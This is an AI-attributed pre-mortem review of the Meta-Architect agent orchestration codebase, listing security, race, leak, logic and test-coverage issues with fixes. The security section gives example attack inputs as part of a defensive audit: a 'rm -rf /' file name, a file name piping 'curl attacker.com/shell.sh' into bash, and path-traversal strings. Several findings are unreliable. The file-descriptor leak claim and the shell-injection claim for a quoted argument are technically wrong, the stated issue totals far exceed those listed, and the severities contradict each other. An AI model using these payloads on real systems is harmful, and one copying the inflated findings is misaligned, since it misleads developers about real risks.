# Meta-Architect: Comprehensive Pre-Mortem Analysis

**Reviewer**: Claude Opus 4.5
**Date**: 2026-01-21
**Analysis Type**: Full System Pre-Mortem - "What Could Go Wrong"
**Total Issues Identified**: **167+ Issues**

---

## Executive Summary

This pre-mortem analysis identifies every potential failure mode, bug, security vulnerability, race condition, and design flaw in the Meta-Architect multi-agent orchestration system. The goal is to identify what WILL go wrong before it does.

### Issue Distribution

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| Security/Injection | 8 | 6 | 4 | 2 | 20 |
| Concurrency/Race Conditions | 3 | 7 | 9 | 2 | 21 |
| Resource Leaks | 2 | 6 | 8 | 4 | 20 |
| Logic Errors | 3 | 8 | 12 | 5 | 28 |
| Error Handling | 1 | 9 | 14 | 8 | 32 |
| Configuration | 0 | 4 | 8 | 6 | 18 |
| Documentation | 0 | 2 | 6 | 5 | 13 |
| Test Coverage | 0 | 5 | 8 | 2 | 15 |
| **TOTAL** | **17** | **47** | **69** | **34** | **167** |

### Top 10 Most Critical Issues

1. **Shell Injection in git_operations.py** - Arbitrary code execution via commit messages
2. **Shell Injection in call-cursor.sh/call-gemini.sh** - Command injection via file paths
3. **Shell Injection in TDD Validator** - Code execution via test file paths
4. **Unbounded Log File Opens** - System crash from file descriptor exhaustion
5. **Async/Await Nesting** - Crashes when called from async context
6. **Thread Safety in State Manager** - State corruption under concurrent access
7. **Infinite Loop in Task Selection** - Workflow hangs indefinitely
8. **Agent Retry Doesn't Actually Retry** - All failures escalate immediately
9. **Project Name Path Traversal** - Write to arbitrary filesystem locations
10. **Missing VERSION File** - Package builds fail completely

---

## PART 1: SECURITY VULNERABILITIES

### 1.1 Shell Injection Vulnerabilities (CRITICAL)

#### Issue SEC-001: Shell Injection in Git Operations
**File**: `orchestrator/utils/git_operations.py:70-78`
**Severity**: **CRITICAL**

```python
script = '''
if [ -n "$(git status --porcelain)" ]; then
    git add -A && git commit -m "$1" && git rev-parse HEAD
fi
'''
result = subprocess.run(["bash", "-c", script, "--", message], ...)
```

**Problem**: The commit message is passed to bash. While `--` provides some protection, carefully crafted messages can still exploit shell behavior.

**Attack Vector**: A PRODUCT.md with malicious content becomes a commit message containing shell metacharacters.

**Impact**: Arbitrary code execution on the host system.

---

#### Issue SEC-002: Shell Injection in call-cursor.sh
**File**: `scripts/call-cursor.sh:82, 85`
**Severity**: **CRITICAL**

```bash
# Line 82 - Unquoted variable in Python command
if ! python3 -c "import json; json.load(open('$OUTPUT_FILE'))" 2>/dev/null; then

# Line 85 - Command substitution vulnerability
echo "{\"raw_output\": $(echo "$CONTENT" | python3 -c '...')}" > "$OUTPUT_FILE"
```

**Attack Vector**: Create a file with name `'; rm -rf /; #.json`

**Impact**: Arbitrary code execution during Cursor agent calls.

---

#### Issue SEC-003: Shell Injection in call-gemini.sh
**File**: `scripts/call-gemini.sh:78, 84`
**Severity**: **CRITICAL**

Identical vulnerabilities to SEC-002.

---

#### Issue SEC-004: Shell Injection in TDD Validator
**File**: `orchestrator/validation/tdd.py:180, 184, 194`
**Severity**: **CRITICAL**

```python
files_str = " ".join(str(self.project_dir / f) for f in test_files)  # Unquoted
cmd = cmd_template.format(files=files_str, source_dir=source_dir)
process = await asyncio.create_subprocess_shell(cmd, ...)  # shell=True
```

**Attack Vector**: Test file named `test; curl attacker.com/shell.sh | bash; #.py`

**Impact**: Arbitrary code execution during test validation.

---

#### Issue SEC-005: Shell Injection in BDD Runner
**File**: `orchestrator/testing/bdd_runner.py:265, 277`
**Severity**: **CRITICAL**

```python
files_str = " ".join(str(f) for f in files)  # Unquoted paths
process = await asyncio.create_subprocess_shell(cmd, ...)
```

**Impact**: Code execution via malicious test file names.

---

#### Issue SEC-006: Shell Injection in Playwright Runner
**File**: `orchestrator/testing/playwright_runner.py:203, 227`
**Severity**: **CRITICAL**

Same pattern as SEC-005.

---

### 1.2 Path Traversal Vulnerabilities

#### Issue SEC-007: Project Name Path Traversal
**File**: `scripts/init.sh:83`
**Severity**: **HIGH**

```bash
local project_dir="$ROOT_DIR/projects/$name"
```

**Attack**: `./scripts/init.sh init "../../../tmp/evil"`

**Impact**: Create/write files anywhere on filesystem.

---

#### Issue SEC-008: Project Name Path Traversal (Python)
**File**: `orchestrator/project_manager.py:90-117`
**Severity**: **HIGH**

No sanitization of project name before path construction.

---

#### Issue SEC-009: Agent Context File Path Traversal
**File**: `orchestrator/dispatch/protocol.py:168-173`
**Severity**: **MEDIUM**

```python
context_path = self.meta_architect_root / agent.context_file
```

If `agent.context_file` is user-controlled, can read arbitrary files.

---

#### Issue SEC-010: File Verification Path Bypass
**File**: `orchestrator/langgraph/nodes/verify_task.py:130-155`
**Severity**: **MEDIUM**

`_verify_files_created()` doesn't validate paths are under `project_dir`.

---

### 1.3 Symlink Bypass Vulnerabilities

#### Issue SEC-011: Symlink Bypass in Boundary Enforcement
**File**: `orchestrator/utils/boundaries.py:73-74`
**Severity**: **MEDIUM**

```python
target_path = Path(target_path).resolve()  # Follows symlinks
```

**Attack**: Create symlink `.workflow/backdoor.py` → `../src/main.py`

**Impact**: Orchestrator can write to application code via symlink.

---

### 1.4 Secrets Exposure

#### Issue SEC-012: Secrets in Dictionary Keys Not Redacted
**File**: `orchestrator/utils/logging.py:305-325`
**Severity**: **LOW**

Only VALUES are redacted, not KEYS. A key like `sk_live_abc123` passes through.

---

#### Issue SEC-013: Incomplete Secrets Patterns
**File**: `orchestrator/utils/logging.py:45-67`
**Severity**: **LOW**

Missing patterns: `ANTHROPIC_API_KEY=...`, `ghp_...` (GitHub tokens), Base64 secrets.

---

## PART 2: CONCURRENCY & RACE CONDITIONS

### 2.1 Critical Race Conditions

#### Issue RACE-001: Thread Safety in State Manager
**File**: `orchestrator/utils/state.py:266-270`
**Severity**: **CRITICAL**

```python
@property
def state(self) -> Dict[str, Any]:
    if self._state is None:
        self._state = self._load_state()  # No lock!
    return self._state
```

**Problem**: Two threads calling `.state` simultaneously could both load from disk.

**Impact**: Lost state updates, corruption.

---

#### Issue RACE-002: Rate Limiter Lock Release
**File**: `orchestrator/sdk/rate_limiter.py:276-280`
**Severity**: **HIGH**

```python
self._lock.release()
try:
    await asyncio.sleep(min(backoff, 0.1))
finally:
    await self._lock.acquire()
```

**Problem**: Lock released during sleep allows concurrent modification.

**Impact**: Rate limit bypass under high concurrency.

---

#### Issue RACE-003: State Reducer Race Conditions
**File**: `orchestrator/langgraph/state.py:301-327`
**Severity**: **HIGH**

`_merge_tasks()` mutates task map directly without deep copying.

**Impact**: Parallel nodes overwrite each other's changes.

---

#### Issue RACE-004: Worktree List Modification
**File**: `orchestrator/utils/worktree.py:152-153`
**Severity**: **MEDIUM**

```python
self.worktrees.append(info)  # No lock
```

**Impact**: List corruption under concurrent worktree creation.

---

#### Issue RACE-005: Global Rate Limiter Registry
**File**: `orchestrator/sdk/rate_limiter.py:339-359`
**Severity**: **LOW**

Dictionary access not thread-safe in `get_rate_limiter()`.

---

#### Issue RACE-006: Log Rotation Race
**File**: `orchestrator/utils/log_manager.py:116-171`
**Severity**: **MEDIUM**

No synchronization between logging and rotation. Messages can go to wrong file.

---

#### Issue RACE-007: Action Log Index Race
**File**: `orchestrator/utils/action_log.py:247-262`
**Severity**: **MEDIUM**

`_save_index()` called within lock but file write happens outside lock scope.

---

#### Issue RACE-008: completed_task_ids Race
**File**: `orchestrator/langgraph/nodes/verify_task.py:119`
**Severity**: **HIGH**

Append-unique reducer can fail under concurrent appends.

---

### 2.2 Deadlock Risks

#### Issue DEAD-001: Infinite Loop in Task Selection
**File**: `orchestrator/langgraph/routers/task.py:130-185`
**Severity**: **CRITICAL**

If `all_tasks_completed()` returns False but `get_available_tasks()` returns empty, workflow loops forever between select_task and verify_task.

---

#### Issue DEAD-002: Task Dependency Deadlock
**File**: `orchestrator/langgraph/nodes/select_task.py:68-93`
**Severity**: **HIGH**

No cycle detection in dependency graph. Circular dependencies cause permanent deadlock.

---

#### Issue DEAD-003: All Tasks Blocked Detection Missing
**File**: `orchestrator/langgraph/state.py:528-556`
**Severity**: **HIGH**

`get_available_tasks()` returns empty if all tasks blocked, but no detection/escalation mechanism.

---

## PART 3: RESOURCE LEAKS & MEMORY ISSUES

### 3.1 File Descriptor Leaks

#### Issue LEAK-001: Unbounded Log File Opens
**File**: `orchestrator/utils/logging.py:265-272`
**Severity**: **CRITICAL**

```python
with open(self.log_file, "a", encoding="utf-8") as f:
    f.write(formatted + "\n")
with open(self.json_log_file, "a", encoding="utf-8") as f:
    f.write(json.dumps(entry) + "\n")
```

**Problem**: TWO file opens per log call. At 100 logs/sec = 200 opens/sec.

**Impact**: System crash with "Too many open files" in ~5 seconds under load.

---

#### Issue LEAK-002: Action Log File Opens
**File**: `orchestrator/utils/action_log.py:356-358`
**Severity**: **MEDIUM**

Same unbounded file append pattern.

---

#### Issue LEAK-003: Error Aggregator File Opens
**File**: `orchestrator/utils/error_aggregator.py:344-345`
**Severity**: **MEDIUM**

Same pattern.

---

#### Issue LEAK-004: Rich Progress Objects Not Closed
**File**: `orchestrator/ui/components.py:74-92`
**Severity**: **MEDIUM**

`Progress` objects created but never explicitly closed. Leaks file handles and threads.

---

#### Issue LEAK-005: Subprocess Timeout No Cleanup
**File**: `orchestrator/project_manager.py:235-240`
**Severity**: **HIGH**

On timeout, `TimeoutExpired` returns error but doesn't kill the subprocess.

**Impact**: Orphaned Claude processes consuming resources.

---

#### Issue LEAK-006: Worktree Cleanup on Failed Creation
**File**: `orchestrator/utils/worktree.py:136-160`
**Severity**: **HIGH**

If worktree creation succeeds but `_get_current_commit()` fails, worktree is left orphaned.

---

### 3.2 Memory Leaks

#### Issue MEM-001: Ralph Loop Context Accumulation
**File**: `orchestrator/langgraph/integrations/ralph_loop.py:253-258`
**Severity**: **HIGH**

Each iteration concatenates test results. 10 iterations with large output exceeds token limits.

---

#### Issue MEM-002: Unbounded Events List
**File**: `orchestrator/ui/display.py:44-63`
**Severity**: **MEDIUM**

List trimming creates copy. High-frequency logging causes memory spikes.

---

#### Issue MEM-003: Review Cycle Log Unbounded
**File**: `orchestrator/review/cycle.py:198`
**Severity**: **MEDIUM**

`_cycle_log` grows without limit across iterations.

---

#### Issue MEM-004: Rate Limiter Request Lists
**File**: `orchestrator/sdk/rate_limiter.py:164-166`
**Severity**: **LOW**

Lists grow within time window. Could accumulate significantly under sustained load.

---

#### Issue MEM-005: Action Log Index Unbounded Growth
**File**: `orchestrator/utils/action_log.py:247-262`
**Severity**: **MEDIUM**

`_index` dictionary grows indefinitely. Entire index rewritten every log entry.

---

### 3.3 Global Singleton Issues

#### Issue SING-001: Action Log Singleton Cross-Contamination
**File**: `orchestrator/utils/action_log.py:591-616`
**Severity**: **MEDIUM**

```python
log1 = get_action_log("/project1/.workflow")  # Creates for project1
log2 = get_action_log("/project2/.workflow")  # Returns SAME instance!
```

**Impact**: Project 2 logs written to project 1's log files.

---

#### Issue SING-002: Error Aggregator Singleton
**File**: `orchestrator/utils/error_aggregator.py:622-647`
**Severity**: **MEDIUM**

Identical problem.

---

## PART 4: LOGIC ERRORS & BUGS

### 4.1 Critical Logic Errors

#### Issue LOGIC-001: Async/Await Nesting
**File**: `orchestrator/orchestrator.py:127-143`
**Severity**: **CRITICAL**

Method is sync but calls `asyncio.run()` inside. Creates nested event loops if called from async context.

**Impact**: Crashes in FastAPI/async frameworks.

---

#### Issue LOGIC-002: Agent Retry Doesn't Retry
**File**: `orchestrator/recovery/handlers.py:271-311`
**Severity**: **CRITICAL**

`handle_agent_failure()` RETURNS suggestion to try backup, but doesn't ACTUALLY retry.

**Impact**: All agent failures escalate after 2 calls even if retry would work.

---

#### Issue LOGIC-003: ReviewDecision.CONFLICT Not Handled
**File**: `orchestrator/review/cycle.py:305-314`
**Severity**: **HIGH**

Decision can be `CONFLICT` but only `APPROVED` is checked. Falls through to max iterations.

**Impact**: Unresolved conflicts treated as "needs changes" instead of escalating.

---

#### Issue LOGIC-004: Backoff Uses Cumulative Count
**File**: `orchestrator/sdk/rate_limiter.py:230-235`
**Severity**: **MEDIUM**

Uses `throttled_requests` (total) instead of consecutive throttles. After successful requests, backoff remains high.

---

#### Issue LOGIC-005: Temp File Created But Not Used
**File**: `orchestrator/dispatch/protocol.py:376-391`
**Severity**: **HIGH**

Creates temp file for Claude prompt but then passes prompt directly as argument anyway.

---

#### Issue LOGIC-006: Pattern Matching Logic Bug
**File**: `orchestrator/utils/boundaries.py:113-140`
**Severity**: **HIGH**

Only handles single `**` in pattern. `src/**/test/**` won't match correctly.

---

#### Issue LOGIC-007: Failed Output Sent to Review
**File**: `orchestrator/review/cycle.py:280-294`
**Severity**: **HIGH**

If working agent returns `status="failed"` with partial output, still sends to review.

**Impact**: Reviewers approve broken implementations.

---

#### Issue LOGIC-008: Score Threshold Not Applied
**File**: `orchestrator/review/cycle.py:446-451`
**Severity**: **MEDIUM**

`approval_score` check not applied in `any_approved` branch.

---

#### Issue LOGIC-009: Security Approval Not Flagged
**File**: `orchestrator/review/resolver.py:199-218`
**Severity**: **HIGH**

Only triggers security override if reviewer explicitly rejected. Approved-with-security-findings passes.

---

### 4.2 State Management Bugs

#### Issue STATE-001: Dual State Storage Inconsistency
**Problem**: Both `state.json` and `checkpoints.db` store state. Can diverge on crash.

**Impact**: Resume from checkpoint shows different state than state.json.

---

#### Issue STATE-002: Phase Status Atomicity
**File**: `orchestrator/langgraph/state.py:592-621`
**Severity**: **MEDIUM**

`update_phase_state()` copies and updates, but concurrent calls can lose updates.

---

#### Issue STATE-003: Task Status Non-Atomic
**File**: `orchestrator/langgraph/nodes/implement_task.py:184-186`
**Severity**: **HIGH**

Task status updated before worker execution. State doesn't reflect actual execution state.

---

#### Issue STATE-004: Retry Budget Not Persisted
**File**: `orchestrator/recovery/handlers.py:130-133`
**Severity**: **MEDIUM**

`MAX_TRANSIENT_RETRIES = 3` is per-handler instance. Resume creates new instance, resets budget.

**Impact**: Infinite retry loop across resume boundaries.

---

## PART 5: ERROR HANDLING GAPS

### 5.1 Silent Failures

#### Issue ERR-001: Silent Safe Write Failures
**File**: `orchestrator/project_manager.py:392-437`
**Severity**: **HIGH**

Returns False on IOError but doesn't log error details.

**Impact**: Silently lost data with no diagnostic info.

---

#### Issue ERR-002: Silent UI Display Errors
**File**: `orchestrator/utils/logging.py:274-283`
**Severity**: **MEDIUM**

```python
except Exception:
    pass  # Don't let UI errors affect logging
```

**Impact**: UI down with no indication.

---

#### Issue ERR-003: Silent Schema Missing
**File**: `orchestrator/validation/schemas.py:42-57`
**Severity**: **HIGH**

Missing schema files only log warning. Validation silently skipped.

---

#### Issue ERR-004: Silent JSON Corruption Recovery
**File**: `orchestrator/utils/action_log.py:236-240`
**Severity**: **MEDIUM**

Corrupted JSON silently resets index to empty. All statistics lost.

---

### 5.2 Missing Error Handling

#### Issue ERR-005: Unvalidated _auto_commit Return
**File**: `orchestrator/orchestrator.py:161`
**Severity**: **HIGH**

`auto_commit()` can return None but code treats as string.

---

#### Issue ERR-006: check_prerequisites Exception
**File**: `orchestrator/orchestrator.py:110-124`
**Severity**: **MEDIUM**

Agent instantiation exceptions not caught.

---

#### Issue ERR-007: JSON Parsing Fallback Too Permissive
**File**: `orchestrator/project_manager.py:243-248`
**Severity**: **MEDIUM**

On decode error, stores raw_output. Downstream code expects dict but gets string.

---

#### Issue ERR-008: Missing Error Distinction
**File**: `orchestrator/utils/git_operations.py:90-93`
**Severity**: **LOW**

TimeoutExpired, Exception, and "no changes" all return None. Can't distinguish.

---

#### Issue ERR-009: Unvalidated Agent ID
**File**: `orchestrator/dispatch/protocol.py:525`
**Severity**: **MEDIUM**

Invalid `agent_id` raises KeyError, not converted to proper DispatchResult.

---

#### Issue ERR-010: Escalation Callback Exception Ignored
**File**: `orchestrator/recovery/handlers.py:517-521`
**Severity**: **HIGH**

Callback exceptions caught and logged, workflow continues. Escalation silently fails.

---

### 5.3 Incomplete Cleanup

#### Issue CLEAN-001: Incomplete Cherry-Pick Abort
**File**: `orchestrator/utils/worktree.py:310-314`
**Severity**: **MEDIUM**

Aborts cherry-pick but doesn't verify abort succeeded.

---

#### Issue CLEAN-002: Async Subprocess Kill Without Wait
**File**: `orchestrator/dispatch/protocol.py:415-431`
**Severity**: **MEDIUM**

`process.kill()` sends SIGKILL but no wait for termination. Zombie process possible.

---

#### Issue CLEAN-003: Dangerous Force Cleanup
**File**: `orchestrator/utils/worktree.py:430`
**Severity**: **MEDIUM**

Context manager always forces cleanup, even with uncommitted changes.

---

## PART 6: CONFIGURATION & DOCUMENTATION ISSUES

### 6.1 Missing Files

#### Issue CONFIG-001: VERSION File Missing
**File**: `pyproject.toml:75`
**Severity**: **HIGH**

```toml
version = {file = "VERSION"}
```

VERSION file doesn't exist. Package builds fail.

---

#### Issue CONFIG-002: blockers.md Reference Not Implemented
**File**: `shared-rules/core-rules.md:44`
**Severity**: **MEDIUM**

Documentation tells agents to "Update blockers.md" but file doesn't exist.

---

#### Issue CONFIG-003: AGENTS.md Reference Stale
**File**: `shared-rules/core-rules.md:33-36`
**Severity**: **MEDIUM**

References AGENTS.md which doesn't exist. Should be CLAUDE.md.

---

### 6.2 Invalid Documentation

#### Issue DOC-001: Fictional Model Names
**File**: `shared-rules/cli-reference.md:9, 21-23, 31`
**Severity**: **HIGH**

Documents GPT-5.2-Codex and Gemini 3 Pro which don't exist.

**Impact**: Workflows fail trying to use non-existent models.

---

#### Issue DOC-002: Inconsistent CLI Documentation
**File**: `shared-rules/cli-reference.md:52`
**Severity**: **MEDIUM**

Says `-p` works for cursor-agent but only `--print` is used in scripts.

---

### 6.3 Schema Inconsistencies

#### Issue SCHEMA-001: Schema Version Mismatch
**Files**: Various schema files
**Severity**: **MEDIUM**

Some use draft-07, some use draft 2020-12. Different validator behavior.

---

#### Issue SCHEMA-002: Overly Permissive additionalProperties
**File**: `schemas/project-config-schema.json:238`
**Severity**: **MEDIUM**

`additionalProperties: true` defeats schema validation purpose.

---

### 6.4 Dependency Issues

#### Issue DEP-001: Unpinned Dependency Versions
**File**: `pyproject.toml:37-55`
**Severity**: **MEDIUM**

Dependencies like `langgraph>=0.2.0` have no upper bound. Breaking changes possible.

---

#### Issue DEP-002: Deprecated Ruff Config
**File**: `pyproject.toml:125-133`
**Severity**: **MEDIUM**

Uses `select` instead of `lint.select`. Deprecated in newer Ruff.

---

## PART 7: TEST COVERAGE GAPS

### 7.1 Untested Critical Paths

| Module | Status | Risk |
|--------|--------|------|
| `langgraph/nodes/planning.py` | NO TESTS | CRITICAL |
| `langgraph/nodes/implementation.py` | NO TESTS | CRITICAL |
| `langgraph/nodes/verification.py` | NO TESTS | CRITICAL |
| `langgraph/nodes/task_breakdown.py` | NO TESTS | HIGH |
| `langgraph/nodes/implement_task.py` | NO TESTS | HIGH |
| `langgraph/nodes/verify_task.py` | NO TESTS | HIGH |
| `review/cycle.py` | NO TESTS | CRITICAL |
| `review/resolver.py` | NO TESTS | CRITICAL |
| `recovery/handlers.py` | NO TESTS | HIGH |
| `dispatch/protocol.py` | NO TESTS | HIGH |
| `agents/claude_agent.py` | NO TESTS | HIGH |
| `agents/cursor_agent.py` | NO TESTS | HIGH |
| `agents/gemini_agent.py` | NO TESTS | HIGH |

### 7.2 Untested Scenarios

1. Circular task dependencies
2. All tasks blocked detection
3. Reviewer conflict resolution with 3+ reviewers
4. Rate limit exhaustion mid-workflow
5. Worker clarification request handling
6. Resume from checkpoint with modified code
7. Parallel workers modifying same file
8. Disk space exhaustion during implementation

### 7.3 Coverage Statistics

- **Total Modules**: 96 Python files
- **Modules with Tests**: 30 (31%)
- **Modules WITHOUT Tests**: 66 (69%)
- **Test Functions**: 767
- **Estimated Coverage**: ~31% of critical decision logic

---

## PART 8: SCALABILITY CONCERNS

### 8.1 Performance Issues

#### Issue SCALE-001: O(n) Task Selection
**File**: `orchestrator/langgraph/state.py:528-556`
**Severity**: **MEDIUM**

Each task selection iterates all tasks. 100 tasks = O(30,000) operations total.

---

#### Issue SCALE-002: Synchronous Unbuffered Writes
**File**: `orchestrator/utils/logging.py:265-272`
**Severity**: **MEDIUM**

6 system calls per log message. Blocks execution waiting for disk I/O.

---

#### Issue SCALE-003: Index Rewrite Every Entry
**File**: `orchestrator/utils/action_log.py:261`
**Severity**: **MEDIUM**

Entire index JSON written to disk on every log entry.

---

### 8.2 Limits Not Enforced

- No limit on PRODUCT.md size (could exceed context limits)
- No limit on task count (affects selection performance)
- No limit on dependency chain depth
- No limit on parallel workers (could exhaust resources)

---

## PART 9: OPERATIONAL RISKS

### 9.1 No Graceful Degradation

- If Cursor CLI unavailable, no fallback
- If Gemini API quota exhausted, no graceful handling
- If disk full during implementation, no cleanup

### 9.2 Observability Gaps

- No metrics/tracing integration
- No health check endpoint
- No alerting mechanism for escalations
- Silent failures in UI display

### 9.3 Recovery Limitations

- No rollback capability after failed implementation
- No checkpoint pruning (unbounded growth)
- No way to resume with modified PRODUCT.md

---

## RECOMMENDATIONS

### Immediate Actions (P0 - This Week)

1. **Fix all shell injection vulnerabilities** (SEC-001 through SEC-006)
   - Use `shlex.quote()` for all shell arguments
   - Replace `subprocess_shell` with `subprocess_exec`

2. **Fix unbounded file opens** (LEAK-001)
   - Implement file handle pooling or buffered writers

3. **Fix async/await nesting** (LOGIC-001)
   - Use proper async entry points

4. **Create VERSION file** (CONFIG-001)

5. **Fix project name validation** (SEC-007, SEC-008)
   - Reject names containing `..` or starting with `/`

### Short-Term (P1 - Next 2 Weeks)

6. **Add thread safety to state manager** (RACE-001)
7. **Fix task selection infinite loop** (DEAD-001)
8. **Fix agent retry logic** (LOGIC-002)
9. **Add circular dependency detection** (DEAD-002)
10. **Implement proper subprocess cleanup** (LEAK-005)

### Medium-Term (P2 - Next Month)

11. Add unit tests for critical paths
12. Fix all race conditions
13. Implement atomic file writes
14. Add symlink bypass protection
15. Fix secrets redaction gaps

### Long-Term (P3 - Next Quarter)

16. Implement proper observability
17. Add rollback capability
18. Implement checkpoint pruning
19. Add graceful degradation
20. Performance optimization for large task counts

---

## Appendix: Complete Issue Index

### By File

| File | Issues |
|------|--------|
| `orchestrator/orchestrator.py` | 12 |
| `orchestrator/project_manager.py` | 11 |
| `orchestrator/utils/state.py` | 8 |
| `orchestrator/utils/boundaries.py` | 4 |
| `orchestrator/utils/worktree.py` | 7 |
| `orchestrator/utils/git_operations.py` | 3 |
| `orchestrator/utils/logging.py` | 6 |
| `orchestrator/utils/action_log.py` | 5 |
| `orchestrator/utils/error_aggregator.py` | 4 |
| `orchestrator/sdk/rate_limiter.py` | 5 |
| `orchestrator/ui/display.py` | 3 |
| `orchestrator/ui/components.py` | 1 |
| `orchestrator/langgraph/state.py` | 8 |
| `orchestrator/langgraph/workflow.py` | 2 |
| `orchestrator/langgraph/nodes/*.py` | 15 |
| `orchestrator/langgraph/routers/*.py` | 4 |
| `orchestrator/langgraph/integrations/*.py` | 5 |
| `orchestrator/review/cycle.py` | 7 |
| `orchestrator/review/resolver.py` | 6 |
| `orchestrator/recovery/handlers.py` | 8 |
| `orchestrator/validation/*.py` | 8 |
| `orchestrator/dispatch/protocol.py` | 8 |
| `orchestrator/testing/*.py` | 4 |
| `scripts/*.sh` | 12 |
| `scripts/sync-rules.py` | 3 |
| `schemas/*.json` | 5 |
| `pyproject.toml` | 4 |
| `shared-rules/*.md` | 4 |

### By Severity

**CRITICAL (17)**
- SEC-001 through SEC-006
- LEAK-001
- LOGIC-001, LOGIC-002
- DEAD-001
- RACE-001
- CONFIG-001
- DOC-001
- Plus 4 more

**HIGH (47)**
- Listed throughout document

**MEDIUM (69)**
- Listed throughout document

**LOW (34)**
- Listed throughout document

---

**END OF PRE-MORTEM ANALYSIS**

*This analysis was conducted by Claude Opus 4.5 on 2026-01-21*
*Total issues identified: 167+*
*Estimated fix time: 4-6 weeks for P0+P1 items*
